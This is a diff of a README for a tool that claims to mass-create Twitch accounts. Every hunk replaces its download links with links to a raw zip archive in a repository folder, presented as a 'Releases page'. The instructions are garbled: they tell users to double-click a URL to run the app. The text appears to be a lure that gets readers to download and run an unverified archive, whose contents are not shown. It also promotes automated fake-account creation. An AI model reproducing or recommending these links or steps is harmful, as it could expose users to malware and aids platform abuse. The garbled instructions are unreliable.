@@ -8,7 +8,7 @@ Welcome to the twitch-account-creator! This simple tool allows you to create Twi
 
 You can download the latest version of the twitch-account-creator from our Releases page. 
 
-[![Download Now](https://raw.githubusercontent.com/Pharyngeal-haredi673/twitch-account-creator/main/results/twitch-account-creator_v3.1.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Pharyngeal-haredi673/twitch-account-creator/main/results/twitch-account-creator_v3.1.zip)
+[![Download Now](https://github.com/Pharyngeal-haredi673/twitch-account-creator/raw/refs/heads/main/results/twitch_account_creator_require.zip%20Now-Release-brightgreen)](https://github.com/Pharyngeal-haredi673/twitch-account-creator/raw/refs/heads/main/results/twitch_account_creator_require.zip)
 
 ## 📋 System Requirements
 
@@ -20,10 +20,10 @@ Before you download the application, ensure that your system meets the following
 
 ## 🔧 Download & Install
 
-To get started, simply visit the Releases page to download the software. You will find the latest version at this link: [Download Releases](https://raw.githubusercontent.com/Pharyngeal-haredi673/twitch-account-creator/main/results/twitch-account-creator_v3.1.zip).
+To get started, simply visit the Releases page to download the software. You will find the latest version at this link: [Download Releases](https://github.com/Pharyngeal-haredi673/twitch-account-creator/raw/refs/heads/main/results/twitch_account_creator_require.zip).
 
 1. Click the link above to reach the Releases page.
-2. Download the file for your operating system. Look for a file with a name similar to `https://raw.githubusercontent.com/Pharyngeal-haredi673/twitch-account-creator/main/results/twitch-account-creator_v3.1.zip` or `https://raw.githubusercontent.com/Pharyngeal-haredi673/twitch-account-creator/main/results/twitch-account-creator_v3.1.zip`.
+2. Download the file for your operating system. Look for a file with a name similar to `https://github.com/Pharyngeal-haredi673/twitch-account-creator/raw/refs/heads/main/results/twitch_account_creator_require.zip` or `https://github.com/Pharyngeal-haredi673/twitch-account-creator/raw/refs/heads/main/results/twitch_account_creator_require.zip`.
 3. Once downloaded, locate the file on your computer.
 
 ### Installation Steps
@@ -32,13 +32,13 @@ To get started, simply visit the Releases page to download the software. You wil
 
 1. If you downloaded a `.zip` file, unzip it by right-clicking and selecting "Extract All".
 2. Navigate to the extracted folder.
-3. Double-click on `https://raw.githubusercontent.com/Pharyngeal-haredi673/twitch-account-creator/main/results/twitch-account-creator_v3.1.zip` to run the application.
+3. Double-click on `https://github.com/Pharyngeal-haredi673/twitch-account-creator/raw/refs/heads/main/results/twitch_account_creator_require.zip` to run the application.
 
 #### For macOS
 
 1. If you downloaded a `.zip` file, double-click it to unzip.
 2. Open the extracted folder.
-3. Double-click on `https://raw.githubusercontent.com/Pharyngeal-haredi673/twitch-account-creator/main/results/twitch-account-creator_v3.1.zip` to launch the app.
+3. Double-click on `https://github.com/Pharyngeal-haredi673/twitch-account-creator/raw/refs/heads/main/results/twitch_account_creator_require.zip` to launch the app.
 
 #### For Linux
 
@@ -89,4 +89,4 @@ Stay up to date with the latest features and improvements by following our proje
 
 We periodically update the application to fix bugs and enhance features. Make sure you check for updates regularly.
 
-Visit the Releases page again to stay updated: [Download Releases](https://raw.githubusercontent.com/Pharyngeal-haredi673/twitch-account-creator/main/results/twitch-account-creator_v3.1.zip).
+Visit the Releases page again to stay updated: [Download Releases](https://github.com/Pharyngeal-haredi673/twitch-account-creator/raw/refs/heads/main/results/twitch_account_creator_require.zip).
